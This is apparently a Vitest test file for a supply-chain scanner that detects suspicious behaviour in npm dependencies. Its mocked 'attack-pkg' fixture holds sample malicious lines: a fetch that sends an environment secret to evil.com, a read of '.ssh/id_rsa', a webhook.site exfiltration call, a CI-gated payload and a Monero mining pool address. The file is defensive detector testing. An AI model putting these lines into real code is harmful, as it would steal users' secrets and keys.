import { describe, it, expect, vi } from 'vitest';
import type { DependencyGraph, DependencyNode } from '../../src/types/package.js';

// Mock fs to avoid reading actual node_modules
vi.mock('node:fs', async (importOriginal) => {
  const original = await importOriginal<typeof import('node:fs')>();
  return {
    ...original,
    existsSync: vi.fn((p: string) => {
      const norm = typeof p === 'string' ? p.replace(/\\/g, '/') : '';
      if (norm.includes('node_modules/evil-pkg')) return true;
      if (norm.includes('node_modules/safe-pkg')) return true;
      return false;
    }),
    readdirSync: vi.fn((dir: string) => {
      const norm = dir.replace(/\\/g, '/');
      if (norm.includes('evil-pkg')) return ['index.js'];
      if (norm.includes('safe-pkg')) return ['index.js'];
      return [];
    }),
    statSync: vi.fn((p: string) => ({
      isDirectory: () => !p.endsWith('.js'),
      isFile: () => p.endsWith('.js'),
      size: 100,
    })),
    readFileSync: vi.fn((p: string) => {
      const norm = p.replace(/\\/g, '/');
      if (norm.includes('evil-pkg')) {
        return `
          const cp = require('child_process');
          eval(Buffer.from('c2VjcmV0', 'base64').toString());
          process.env.SECRET_KEY;
        `;
      }
      if (norm.includes('safe-pkg')) {
        return `module.exports = function add(a, b) { return a + b; };`;
      }
      return '';
    }),
  };
});

const { scanBehavior } = await import('../../src/core/scanner/behavior.js');

function makeGraph(packages: Array<{ name: string; version?: string; isProduction?: boolean }>): DependencyGraph {
  const graph: DependencyGraph = new Map();
  for (const pkg of packages) {
    const node: DependencyNode = {
      name: pkg.name,
      version: pkg.version ?? '1.0.0',
      isProduction: pkg.isProduction ?? true,
      dependencies: [],
      integrity: null,
      resolved: null,
    };
    graph.set(`${pkg.name}@${pkg.version ?? '1.0.0'}`, node);
  }
  return graph;
}

describe('behavioral analysis', () => {
  it('detects suspicious patterns in evil-pkg', () => {
    const graph = makeGraph([{ name: 'evil-pkg' }]);
    const findings = scanBehavior(graph, '/fake/project');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    const types = findings.flatMap(f => f.behaviors.map(b => b.type));
    expect(types).toContain('child_process');
    expect(types).toContain('eval');
  });

  it('finds nothing suspicious in safe-pkg', () => {
    const graph = makeGraph([{ name: 'safe-pkg' }]);
    const findings = scanBehavior(graph, '/fake/project');
    expect(findings).toHaveLength(0);
  });

  it('marks production flag correctly', () => {
    const graph = makeGraph([{ name: 'evil-pkg', isProduction: false }]);
    const findings = scanBehavior(graph, '/fake/project');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].isProduction).toBe(false);
  });

  it('detects new supply chain attack patterns', async () => {
    // Re-mock readFileSync to return content with new patterns
    const fs = await import('node:fs');
    const origReadFileSync = vi.mocked(fs.readFileSync);
    const origExistsSync = vi.mocked(fs.existsSync);
    const origReaddirSync = vi.mocked(fs.readdirSync);

    origExistsSync.mockImplementation((p: unknown) => {
      const norm = String(p).replace(/\\/g, '/');
      if (norm.includes('node_modules/attack-pkg')) return true;
      if (norm.includes('node_modules/evil-pkg')) return true;
      if (norm.includes('node_modules/safe-pkg')) return true;
      return false;
    });

    origReaddirSync.mockImplementation(((dir: string) => {
      const norm = dir.replace(/\\/g, '/');
      if (norm.includes('attack-pkg')) return ['index.js'];
      if (norm.includes('evil-pkg')) return ['index.js'];
      if (norm.includes('safe-pkg')) return ['index.js'];
      return [];
    }) as unknown as typeof fs.readdirSync);

    origReadFileSync.mockImplementation(((p: string) => {
      const norm = p.replace(/\\/g, '/');
      if (norm.includes('attack-pkg')) {
        return [
          'if (process.env.GITHUB_ACTIONS) { runPayload(); }',
          'setTimeout(function() { exfiltrate(); }, 100000);',
          'fetch("https://evil.com/${process.env.SECRET}");',
          'const key = readFileSync(".ssh/id_rsa");',
          'WebAssembly.instantiate(wasmBuffer);',
          'const loc = require("geoip");',
          'fetch("https://webhook.site/abc123");',
          'const miner = "stratum+tcp://pool.monero.com";',
        ].join('\n');
      }
      if (norm.includes('evil-pkg')) {
        return `
          const cp = require('child_process');
          eval(Buffer.from('c2VjcmV0', 'base64').toString());
          process.env.SECRET_KEY;
        `;
      }
      if (norm.includes('safe-pkg')) {
        return `module.exports = function add(a, b) { return a + b; };`;
      }
      return '';
    }) as unknown as typeof fs.readFileSync);

    const graph = makeGraph([{ name: 'attack-pkg' }]);
    const findings = scanBehavior(graph, '/fake/project');
    expect(findings.length).toBeGreaterThanOrEqual(1);

    const types = findings.flatMap(f => f.behaviors.map(b => b.type));
    expect(types).toContain('ci-env-gate');
    expect(types).toContain('delayed-exec');
    expect(types).toContain('credential-paths');
    expect(types).toContain('wasm-load');
    expect(types).toContain('geoip');
    expect(types).toContain('exfil-service');
    expect(types).toContain('crypto-mining');
  });
});
